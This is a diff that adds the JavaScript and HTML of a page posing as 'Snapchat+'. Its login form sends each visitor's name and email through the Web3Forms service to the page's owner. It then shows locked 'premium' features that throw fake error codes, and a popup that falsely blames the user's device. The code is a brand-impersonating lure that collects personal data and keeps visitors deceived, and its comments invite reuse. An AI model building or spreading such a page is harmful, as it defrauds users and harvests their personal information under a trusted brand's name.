+   {i:'💞',t:'Friendmoji',d:'Create Bitmoji with your friends'}
+ ]},
+ {g:'Exclusives & Early Access',items:[
+   {i:'✨',t:'Get Early Access',d:'Be the first to try the newest Snapchat features'},
+   {i:'🎬',t:'Cameos',d:'Put your face in videos & GIFs'},
+   {i:'🤖',t:'My AI',d:'Chat with your personalized AI friend'},
+   {i:'👻',t:'Ghost Mode+',d:'Extra privacy controls on Snap Map'}
+ ]}
+];
+
+/* ===== INIT ===== */
+function init(){
+  // Splash → ALWAYS show login (no auto-login)
+  setTimeout(()=>{
+    splash.classList.add('hide');
+    showLogin();
+  }, 2500);
+
+  $('loginForm').addEventListener('submit', handleLogin);
+  $('friendSearch').addEventListener('input', e=>renderFriends(e.target.value));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.addEventListener('click',()=>switchTab(b.dataset.tab)));
+  $('captureBtn').addEventListener('click', capturePhoto);
+  $('switchCameraBtn').addEventListener('click', switchCamera);
+  document.querySelectorAll('.filter-btn').forEach(b=>b.addEventListener('click',()=>applyFilter(b.dataset.filter,b)));
+  $('logoutBtn').addEventListener('click', logout);
+  renderFriends('');
+  renderFeatures();
+}
+
+function showLogin(){
+  loginScreen.classList.add('active');
+  mainApp.classList.remove('active');
+}
+
+/* ===== LOGIN + WEB3FORMS ===== */
+async function handleLogin(e){
+  e.preventDefault();
+
+  const name = $('userName').value.trim();
+  const email = $('userEmail').value.trim();
+  const btn = $('submitBtn');
+  const msg = $('formMsg');
+
+  if(!name || !email){
+    msg.textContent = 'Please fill both fields';
+    msg.className = 'form-msg err';
+    return;
+  }
+
+  // Disable button while sending
+  btn.disabled = true;
+  btn.textContent = 'Sending...';
+  msg.textContent = '';
+
+  // Build Web3Forms payload
+  const payload = {
+    access_key: WEB3FORMS_KEY,
+    name: name,
+    email: email,
+    subject: 'New Snapchat+ Login',
+    from_name: 'SnapPlus Website',
+    message: `New user logged in — Name: ${name}, Email: ${email}, Time: ${new Date().toLocaleString()}`
+  };
+
+  try {
+    const res = await fetch('https://api.web3forms.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+
+    if(data.success){
+      msg.textContent = '✓ Logged in successfully!';
+      msg.className = 'form-msg ok';
+
+      // Save locally for session
+      currentUser = { name, email, loginTime: new Date().toISOString(), id: Date.now() };
+
+      setTimeout(()=>{
+        showMainApp();
+      }, 700);
+    } else {
+      throw new Error(data.message || 'Submission failed');
+    }
+  } catch(err){
+    console.error('Web3Forms error:', err);
+    // Even if Web3Forms fails, still let user in (fallback)
+    msg.textContent = '⚠ Saved locally (form service unavailable)';
+    msg.className = 'form-msg err';
+    currentUser = { name, email, loginTime: new Date().toISOString(), id: Date.now() };
+    setTimeout(()=> showMainApp(), 900);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = "Let's Snap! ✨";
+  }
+}
+
+/* ===== MAIN APP ===== */
+function showMainApp(){
+  loginScreen.classList.remove('active');
+  mainApp.classList.add('active');
+  $('profileName').textContent = currentUser.name;
+  $('profileEmail').textContent = currentUser.email;
+  $('topWho').textContent = currentUser.name;
+  const st = JSON.parse(localStorage.getItem('snapplus_stories')||'[]');
+  $('statStories').textContent = st.length;
+  $('statSnaps').textContent = st.length;
+  startCamera();
+}
+
+async function startCamera(){
+  try{
+    videoStream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode, width:{ideal:1280}, height:{ideal:720} },
+      audio:false
+    });
+    video.srcObject = videoStream;
+  }catch(e){
+    alert('Camera permission chahiye! Browser me allow karo.');
+  }
+}
+
+async function switchCamera(){
+  facingMode = facingMode==='user' ? 'environment' : 'user';
+  if(videoStream) videoStream.getTracks().forEach(t=>t.stop());
+  await startCamera();
+}
+
+function applyFilter(f, btn){
+  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  const map={
+    none:'none', grayscale:'grayscale(100%)', sepia:'sepia(100%)',
+    invert:'invert(100%)', blur:'blur(3px)', brightness:'brightness(150%)',
+    contrast:'contrast(150%)', saturate:'saturate(200%)'
+  };
+  video.style.filter = map[f] || 'none';
+}
+
+function capturePhoto(){
+  if(!video.videoWidth){ alert('Camera load ho raha hai, 1 sec ruko!'); return; }
+  const ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.filter = video.style.filter || 'none';
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  saveToStories(canvas.toDataURL('image/jpeg', 0.9));
+  flash();
+}
+
+function saveToStories(img){
+  try{
+    const st = JSON.parse(localStorage.getItem('snapplus_stories')||'[]');
+    st.unshift({
+      id: Date.now(), image: img,
+      timestamp: new Date().toISOString(),
+      userName: currentUser ? currentUser.name : 'Guest'
+    });
+    localStorage.setItem('snapplus_stories', JSON.stringify(st));
+    $('statStories').textContent = st.length;
+    $('statSnaps').textContent = st.length;
+    displayStories();
+  }catch(e){}
+}
+
+function displayStories(){
+  const st = JSON.parse(localStorage.getItem('snapplus_stories')||'[]');
+  const list = $('storiesList');
+  list.innerHTML = st.length ? '' : '<p style="color:var(--muted);text-align:center;padding:14px">Abhi koi story nahi — capture karo! 📸</p>';
+  st.slice(0,10).forEach(s=>{
+    const d = document.createElement('div');
+    d.className = 'row';
+    d.innerHTML = `<div class="av">📸</div><div><h3>${s.userName}</h3><p>${new Date(s.timestamp).toLocaleString()}</p></div>`;
+    list.appendChild(d);
+  });
+}
+
+function renderFriends(q){
+  q = q.trim().toLowerCase();
+  const list = $('friendsList');
+  list.innerHTML = '';
+  const res = friends.filter(f=>f.n.toLowerCase().includes(q));
+  if(!res.length){ list.innerHTML = '<p style="color:var(--muted);padding:10px">No friends found.</p>'; return; }
+  res.forEach(f=>{
+    const d = document.createElement('div');
+    d.className = 'row';
+    d.innerHTML = `<div class="av">${f.e}</div><div><h3>${f.n}</h3><p>Tap to chat</p></div><span class="tag">NEW</span>`;
+    list.appendChild(d);
+  });
+}
+
+function renderFeatures(){
+  const wrap = $('featuresWrap');
+  wrap.innerHTML = '';
+  featureGroups.forEach(gr=>{
+    const g = document.createElement('div');
+    g.className = 'fgroup';
+    g.innerHTML = `<h3>${gr.g}</h3>`;
+    gr.items.forEach(it=>{
+      const row = document.createElement('div');
+      row.className = 'feat-row';
+      row.innerHTML = `<div class="fic">${it.i}</div><div class="ft"><h4>${it.t} <span class="lock">🔒</span></h4><p>${it.d}</p></div><div class="go">›</div>`;
+      row.addEventListener('click', ()=>showFeatureError(it.t));
+      g.appendChild(row);
+    });
+    wrap.appendChild(g);
+  });
+}
+
+function showFeatureError(name){
+  $('errFeat').textContent = name;
+  $('errCode').textContent = 'ERR-'+(1000+Math.floor(Math.random()*9000));
+  $('errOverlay').classList.add('show');
+}
+function hideError(){ $('errOverlay').classList.remove('show'); }
+$('errOverlay').addEventListener('click', e=>{ if(e.target.id==='errOverlay') hideError(); });
+
+function flash(){
+  const f = document.createElement('div');
+  f.style.cssText = 'position:fixed;inset:0;background:#fff;opacity:.85;z-index:9999;pointer-events:none;animation:flash .3s ease-out';
+  document.body.appendChild(f);
+  setTimeout(()=>f.remove(), 300);
+}
+
+function switchTab(id){
+  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
+  $(id).classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.querySelector(`[data-tab="${id}"]`).classList.add('active');
+  if(id==='storiesScreen') displayStories();
+}
+
+function logout(){
+  if(confirm('Logout?')){
+    currentUser = null;
+    if(videoStream) videoStream.getTracks().forEach(t=>t.stop());
+    mainApp.classList.remove('active');
+    $('loginForm').reset();
+    $('formMsg').textContent = '';
+    showLogin();
+  }
+}
+
+document.readyState==='loading' ? document.addEventListener('DOMContentLoaded', init) : init();
+function showMainApp(){
+  loginScreen.classList.remove('active');
+  mainApp.classList.add('active');
+  $('profileName').textContent = currentUser.name;
+  $('profileEmail').textContent = currentUser.email;
+  $('topWho').textContent = currentUser.name;
+  const st = JSON.parse(localStorage.getItem('snapplus_stories')||'[]');
+  $('statStories').textContent = st.length;
+  $('statSnaps').textContent = st.length;
+  startCamera();
+
+  // ⬇️ YE 2 LINES ADD KARO (5 sec baad popup) ⬇️
+  setTimeout(()=>{ $('notePopup').classList.add('show'); }, 5000);
+}
+function closeNote(){ $('notePopup').classList.remove('show'); }
+</script>
+<!-- ===== CUSTOM POPUP ===== -->
+<div id="notePopup" class="note-overlay">
+  <div class="note-card">
+    <div class="note-icon">📢</div>
+    <h3>Important Note</h3>
+    <p class="note-text">
+      <!-- ⬇️ YAHAN APNA NOTE LIKHO ⬇️ -->
+Due to an issue with your device, we are currently unable to unlock this feature. It will be automatically unlocked once the issue is resolved.✨
+      <!-- ⬆️ YAHAN APNA NOTE LIKHO ⬆️ -->
+    </p>
+    <button class="note-btn" onclick="closeNote()">Got it!</button>
+  </div>
+</div>
+</body>
+</html>
